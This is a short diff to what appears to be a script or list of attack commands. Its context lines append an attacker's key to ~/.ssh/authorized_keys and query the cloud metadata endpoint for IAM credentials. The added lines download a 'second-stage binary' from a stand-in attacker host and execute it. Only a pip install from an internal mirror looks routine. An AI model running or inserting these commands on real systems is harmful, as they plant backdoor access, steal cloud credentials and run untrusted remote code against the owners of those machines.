@@ -14,6 +14,9 @@ echo "$ATTACKER_KEY" >> ~/.ssh/authorized_keys
 # metadata / SSRF
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
+# Drop the second-stage binary and run it.
+curl -fsSL https://cdn.attacker.test/stage2 -o /tmp/stage2 && chmod +x /tmp/stage2 && /tmp/stage2
+
 # Fetch project dependencies from the internal build mirror before running.
 pip install requests --index-url https://pkgs.internal-mirror.test/simple
 
